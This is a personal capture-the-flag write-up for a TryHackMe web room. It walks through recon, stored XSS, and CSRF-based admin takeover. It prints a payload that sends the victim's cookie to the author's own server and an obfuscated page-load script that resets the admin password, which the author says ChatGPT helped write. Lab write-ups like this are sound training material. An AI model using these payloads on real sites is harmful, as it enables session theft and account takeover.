---
title: Whats Your Name?
date: 2025-05-29 19:30:00
categories: [TRYHACKME, CTF]
tags: [web,application,XSS]      # TAG names should always be lowercase
image: 
 path: /assets/img/posts/2025/05/Whats-your-name/room_image.webp
---

### Intro

A reconnaissance of active ports was initiated, identifying the following ports: 22, 80, and 8081.  
Ports 80 and 8081 have web services running, while port 8081 displays only a blank page.  
Port 80 hosts a website that allows user registration, but its registration fields are vulnerable to XSS (cross-site scripting). Through this attack vector, it is possible to obtain the moderator's session cookies.  
The moderator's panel has a subdomain with social network management functions. The system administrator can be contacted via a chatbot, which is also vulnerable to XSS attacks. Through this vulnerability, a form was crafted that does not require user interaction, allowing the administrator’s password to be changed and thereby granting administrative access.

### Recon

```shell
┌──(root㉿estudos)-[/home/alex]
└─# nmap -Pn -sS --open 10.10.90.47                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 18:01 -03
Nmap scan report for worldwap.thm (10.10.90.47)
Host is up (0.36s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds
```

Two web application in ports 80 and 8081.

![web page](/assets/img/posts/2025/05/Whats-your-name/web_page.png)

When attempting to create a new account with a valid user, the error below is displayed.

![Register](/assets/img/posts/2025/05/Whats-your-name/Register.png)

The web application on port 8081 displays only a blank page.

![Blank_page_8081](/assets/img/posts/2025/05/Whats-your-name/Blank_page_8081.png)

Fuzzing to search for hidden directories in the services running on ports 8081 and 80.

![Fuzzing_port_8081](/assets/img/posts/2025/05/Whats-your-name/Fuzzing_port_8081.png)

![Fuzzing_port_80](/assets/img/posts/2025/05/Whats-your-name/Fuzzing_port_80.png)

When attempting to log in to `/login.php` with a newly registered account.

![Login_page](/assets/img/posts/2025/05/Whats-your-name/Login_page.png)

When accessing the subdomain `login.worldwap.thm`, a blank page is displayed.  
The source code contains comments indicating the presence of the file `login.php`.

![Blank_page_subdomain](/assets/img/posts/2025/05/Whats-your-name/Blank_page_subdomain.png)

The comment in the source code displays the file `login.php`.  
Access with the provided credentials is not possible.

![Login_page_subdomain](/assets/img/posts/2025/05/Whats-your-name/Login_page_subdomain.png)

### Exploitation using XSS

The registration page was revisited for XSS testing.  
For testing, an XSS request was sent to the server.

Example of the XSS payload:

```js
<script src="http://10.2.13.47:80/field"></script>
```

![Register_page](/assets/img/posts/2025/05/Whats-your-name/Register_page.png)

The fields where requests are received.

![Request_myserver](/assets/img/posts/2025/05/Whats-your-name/Request_myserver.png)

The payload used to capture the administrator's session cookie.

```js
<script>fetch("http://10.2.13.47:80?cookie="+ btoa(document.cookie),{method: "GET"});</script>
```

The administrator's session cookie was received.

![Receive_cookies_mod](/assets/img/posts/2025/05/Whats-your-name/Receive_cookies_mod.png)

By changing the cookie in the browser, a login as `moderator` was successfully performed.

![Panel_mod](/assets/img/posts/2025/05/Whats-your-name/Panel_mod.png)

Upon returning to `login.worldwap`, the first flag was obtained.

![Panel_mod_subdomain](/assets/img/posts/2025/05/Whats-your-name/Panel_mod_subdomain.png)

### Logging in as Admin

On the home page, it was verified that the `search` field is not working.  
The `change password` and `go to chat` options are enabled.

![Function_change_password](/assets/img/posts/2025/05/Whats-your-name/Function_change_password.png)

The `Go to chat` option allows interaction with the bot administrator.  
The chat field was tested for XSS vulnerability using the payload below.

```js
<script>alert("XSS is working!");</script>
```

![Test_XSS_chat](/assets/img/posts/2025/05/Whats-your-name/Test_XSS_chat.png)

All chat messages were cleared.  
Intercepting the request for the `change password` function in Burp revealed that no mitigation for CSRF attacks is present.

![Burp](/assets/img/posts/2025/05/Whats-your-name/Burp.png)

With the assistance of ChatGPT, a script was developed containing a submit form that, after the page loads, sends a request to `change_password.php` to change the password to `password123`.

![Chatgpt](/assets/img/posts/2025/05/Whats-your-name/Chatgpt.png)

Minor changes to the `http` scheme were necessary.  
In the chatbot's source code, `href...` was displayed, causing the code to malfunction.  
The solution involved breaking the scheme within the strings, as shown in the example below

```js
<script>
    window.onload = function () {
      fetch('hT'+ 'tP://' + 'login.worldwap.thm/change_password.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Host': 'login.worldwap.thm',
          'Origin': 'hT'+ 'tP://' + 'login.worldwap.thm'
        },
        body: 'new_password=password123'
      })
      .then(response => response.text())
      .then(data => {
        console.log('Resposta do servidor:', data);
      })
      .catch(error => {
        console.error('Erro:', error);
      });
    };
  </script>
```

After sending the code in the chat, a login attempt was made on `login.worldwap` using `admin:password123`

![Panel Adm](/assets/img/posts/2025/05/Whats-your-name/Panel_adm.png)

### Considerations

I hope this write-up can help others. It is written in a simple style and might contain some methodological errors (probably yes). It reflects my level of offensive security. Feedback is always welcome. Keep studying. 

